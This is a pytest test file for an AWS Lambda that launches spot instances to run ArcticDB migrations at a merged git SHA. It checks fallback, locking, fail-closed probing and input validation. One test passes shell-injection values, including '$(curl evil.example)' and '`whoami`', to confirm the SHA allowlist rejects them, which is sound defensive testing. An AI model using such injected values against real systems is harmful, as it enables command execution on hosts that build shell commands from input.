"""Unit tests for the merge-triggered ArcticDB migration spot dispatcher
(alpha-engine-config-I3242).

Hermetic: ``nousergon_lib.ec2_spot`` and ``boto3`` are stubbed in sys.modules
BEFORE importing index (mirrors sf-watch-spot-dispatcher/test_handler.py —
index.py itself imports the REAL nousergon_lib.spot_dispatch, which resolves
its own `from nousergon_lib import ec2_spot` / `import boto3` against these
stubs). Validates: a valid event launches a spot box and fires an async SSM
command carrying the merged_sha checked out via git fetch+checkout (not a
branch tip); the on-demand fallback on spot capacity exhaustion; a total
launch failure returns a clean launched:false rather than raising; the
(head_migration_number)-scoped concurrency lock returns concurrent_skip (no
defer — a duplicate dispatch of already-merged work is safe to just skip,
unlike sf-watch's repeat-failure defer-not-drop problem); a FAILED
concurrency probe returns probe_failed WITHOUT launching (the deliberate
fail-CLOSED posture difference from sf-watch's coverage-beats-dedupe site 1 —
two boxes racing the same head is a correctness risk here); a post-launch SSM
failure terminates the box and returns launched:false; a malformed event
returns launched:false rather than raising; and the kill-switch short-circuit.
"""

from __future__ import annotations

import importlib
import os
import sys
import types

import pytest

sys.path.insert(0, os.path.dirname(__file__))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))


# ── Stub nousergon_lib.ec2_spot + boto3 before importing index ─────────────────
class _SpotLaunchError(Exception):
    pass


class _SpotCapacityExhausted(_SpotLaunchError):
    pass


class _SpotQuotaExceededError(_SpotLaunchError):
    pass


def _install_stubs(launch_impl, boto_clients):
    ec2_spot_mod = types.ModuleType("nousergon_lib.ec2_spot")
    ec2_spot_mod.SpotLaunchError = _SpotLaunchError
    ec2_spot_mod.SpotCapacityExhausted = _SpotCapacityExhausted
    ec2_spot_mod.SpotQuotaExceededError = _SpotQuotaExceededError
    ec2_spot_mod.launch = launch_impl
    sys.modules["nousergon_lib.ec2_spot"] = ec2_spot_mod

    boto3_mod = types.ModuleType("boto3")
    boto3_mod.client = lambda name, **kw: boto_clients[name]
    sys.modules["boto3"] = boto3_mod


class _FakeWaiter:
    def wait(self, **kw):
        return None


class _FakeEc2:
    def __init__(self, running_instances=None):
        self.terminated = []
        self._running_instances = dict(running_instances or {})

    def get_waiter(self, name):
        return _FakeWaiter()

    def terminate_instances(self, InstanceIds):  # noqa: N803 — boto3 kwarg name
        self.terminated.extend(InstanceIds)
        return {"TerminatingInstances": [{"InstanceId": i} for i in InstanceIds]}

    def describe_instances(self, Filters):  # noqa: N803 — boto3 kwarg name
        by_name = {f["Name"]: f["Values"] for f in Filters}
        head = by_name.get("tag:arctic-migration-head", [None])[0]
        ids = self._running_instances.get(head, [])
        return {"Reservations": [{"Instances": [{"InstanceId": i} for i in ids]}]} if ids else {"Reservations": []}


class _FakeSsm:
    def __init__(self):
        self.sent = []

    def describe_instance_information(self, **kw):
        return {"InstanceInformationList": [{"PingStatus": "Online"}]}

    def send_command(self, **kw):
        self.sent.append(kw)
        return {"Command": {"CommandId": "cmd-123"}}


def _load(monkeypatch, *, launch_impl=None, env=None, running_instances=None):
    for k, v in (env or {}).items():
        monkeypatch.setenv(k, v)
    ssm = _FakeSsm()
    ec2 = _FakeEc2(running_instances=running_instances)
    clients = {"ec2": ec2, "ssm": ssm}
    if launch_impl is None:
        launch_impl = lambda types_, subnets, **kw: "i-stub"  # noqa: E731
    _install_stubs(launch_impl, clients)

    from _shared.hermetic_import_guard import assert_hermetic_imports_satisfied

    assert_hermetic_imports_satisfied(__file__)
    if "nousergon_lib.spot_dispatch" in sys.modules:
        importlib.reload(sys.modules["nousergon_lib.spot_dispatch"])
    else:
        import nousergon_lib.spot_dispatch  # noqa: F401 — first import picks up the current stub

    _sd = sys.modules["nousergon_lib.spot_dispatch"]
    if not hasattr(_sd, "SpotProbeError"):
        _sd.SpotProbeError = type("SpotProbeError", (Exception,), {})

    import index

    importlib.reload(index)
    index._test_ssm = ssm
    index._test_ec2 = ec2
    return index


def _event(**overrides):
    base = {
        "merged_sha": "a" * 40,
        "head_migration_number": 1,
    }
    base.update(overrides)
    return base


def test_valid_event_launches_spot_and_sends_async_ssm(monkeypatch):
    calls = {}

    def _launch(types_, subnets, **kw):
        calls["spot"] = kw.get("spot")
        calls["profile"] = kw.get("iam_instance_profile")
        calls["tag_name"] = kw.get("tag_name")
        return "i-abc"

    idx = _load(monkeypatch, launch_impl=_launch, env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(), None)
    assert out["launched"] is True
    assert out["reason"] == "launched"
    assert out["instance_id"] == "i-abc"
    assert out["market"] == "spot"
    assert out["command_id"] == "cmd-123"
    assert out["head_migration_number"] == 1
    assert out["merged_sha"] == "a" * 40
    assert calls["spot"] is True
    assert calls["profile"] == "alpha-engine-executor-profile"
    assert calls["tag_name"] == "alpha-engine-arctic-migration-spot"
    assert idx._test_ec2.terminated == []

    sent = idx._test_ssm.sent[0]
    cmd = sent["Parameters"]["commands"][0]
    assert f"git fetch --quiet --depth 1 origin {'a' * 40}" in cmd
    assert f"git checkout --quiet {'a' * 40}" in cmd
    assert f"python scripts/run_arctic_migrations.py --merged-sha {'a' * 40}" in cmd
    assert "--head-migration-number 1" in cmd
    assert sent["Parameters"]["executionTimeout"] == [str(idx.MAX_RUNTIME_SECONDS)]


def test_on_demand_fallback_on_spot_capacity_exhaustion(monkeypatch):
    seen = []

    def _launch(types_, subnets, **kw):
        seen.append(kw.get("spot"))
        if kw.get("spot"):
            raise _SpotCapacityExhausted("no capacity in any pool")
        return "i-ondemand"

    idx = _load(monkeypatch, launch_impl=_launch, env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(), None)
    assert out["launched"] is True
    assert out["market"] == "on-demand"
    assert out["instance_id"] == "i-ondemand"
    assert seen == [True, False]


def test_total_launch_exhaustion_returns_clean_false_not_raise(monkeypatch):
    def _launch(types_, subnets, **kw):
        raise _SpotCapacityExhausted("exhausted everywhere")

    idx = _load(monkeypatch, launch_impl=_launch, env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(), None)
    assert out["launched"] is False
    assert out["reason"] == "launch_failed"
    assert "exhausted everywhere" in out["error"]
    assert idx._test_ssm.sent == []


def test_concurrent_skip_for_same_head_no_launch(monkeypatch):
    launched = []

    def _launch(types_, subnets, **kw):
        launched.append(True)
        return "i-new"

    idx = _load(
        monkeypatch, launch_impl=_launch, env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"},
        running_instances={"1": ["i-already-running"]},
    )
    out = idx.handler(_event(head_migration_number=1), None)
    assert out["launched"] is False
    assert out["reason"] == "concurrent_skip"
    assert out["existing_instance_ids"] == ["i-already-running"]
    assert launched == []


def test_different_head_is_not_blocked(monkeypatch):
    idx = _load(
        monkeypatch, launch_impl=lambda types_, subnets, **kw: "i-new",  # noqa: E731
        env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"},
        running_instances={"1": ["i-other-head"]},
    )
    out = idx.handler(_event(head_migration_number=2), None)
    assert out["launched"] is True
    assert out["instance_id"] == "i-new"


def test_concurrency_probe_failure_refuses_fail_closed(monkeypatch):
    """DELIBERATE POSTURE DIFFERENCE from sf-watch's site-1 policy (coverage
    beats dedupe): a migration full-rewrite racing a duplicate box is a
    correctness risk, so a broken probe here REFUSES rather than launching
    anyway."""
    idx = _load(
        monkeypatch, launch_impl=lambda types_, subnets, **kw: "i-should-not-launch",  # noqa: E731
        env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"},
    )

    def _boom(Filters):  # noqa: N803 — boto3 kwarg name
        raise RuntimeError("EC2 API hiccup")

    idx._test_ec2.describe_instances = _boom
    out = idx.handler(_event(), None)
    assert out["launched"] is False
    assert out["reason"] == "probe_failed"
    assert idx._test_ssm.sent == []


def test_post_launch_ssm_failure_terminates_instance_returns_clean_false(monkeypatch):
    idx = _load(
        monkeypatch, launch_impl=lambda types_, subnets, **kw: "i-orphan",  # noqa: E731
        env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"},
    )

    def _boom_send(**kw):
        raise RuntimeError("SSM SendCommand failed")

    idx._test_ssm.send_command = _boom_send
    out = idx.handler(_event(), None)
    assert out["launched"] is False
    assert out["reason"] == "post_launch_failed"
    assert out["instance_id"] == "i-orphan"
    assert idx._test_ec2.terminated == ["i-orphan"]


def test_malformed_merged_sha_returns_clean_false(monkeypatch):
    idx = _load(monkeypatch, env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(merged_sha="not-a-sha"), None)
    assert out["launched"] is False
    assert out["reason"] == "invalid_event"
    assert idx._test_ssm.sent == []


def test_missing_head_migration_number_returns_clean_false(monkeypatch):
    idx = _load(monkeypatch, env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"})
    event = _event()
    del event["head_migration_number"]
    out = idx.handler(event, None)
    assert out["launched"] is False
    assert out["reason"] == "invalid_event"


def test_malformed_head_migration_number_returns_clean_false(monkeypatch):
    idx = _load(monkeypatch, env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(head_migration_number="not-a-number"), None)
    assert out["launched"] is False
    assert out["reason"] == "invalid_event"


def test_disabled_flag_short_circuits(monkeypatch):
    idx = _load(monkeypatch, env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "false"})
    out = idx.handler(_event(), None)
    assert out["launched"] is False
    assert out["reason"] == "disabled"
    assert idx._test_ssm.sent == []


def test_cause_free_merged_sha_never_appears_unquoted_dangerously(monkeypatch):
    """Defense-in-depth: the SHA allowlist (_SHA_RE, 40 hex chars after
    lowercasing) rules out shell-metacharacter injection outright — a
    malformed value never reaches the constructed SSM command at all (see
    test_malformed_merged_sha_returns_clean_false). Note: a 40-char
    UPPERCASE-hex sha is deliberately normalized (lowercased) before
    validation, not rejected — see test_uppercase_merged_sha_is_normalized."""
    idx = _load(monkeypatch, env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"})
    for dangerous in ('$(curl evil.example)', '`whoami`', 'a' * 39, 'not-a-sha-at-all'):
        out = idx.handler(_event(merged_sha=dangerous), None)
        assert out["launched"] is False
        assert out["reason"] == "invalid_event"


def test_uppercase_merged_sha_is_normalized_not_rejected(monkeypatch):
    idx = _load(
        monkeypatch, launch_impl=lambda types_, subnets, **kw: "i-stub",  # noqa: E731
        env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"},
    )
    out = idx.handler(_event(merged_sha="A" * 40), None)
    assert out["launched"] is True
    assert out["merged_sha"] == "a" * 40
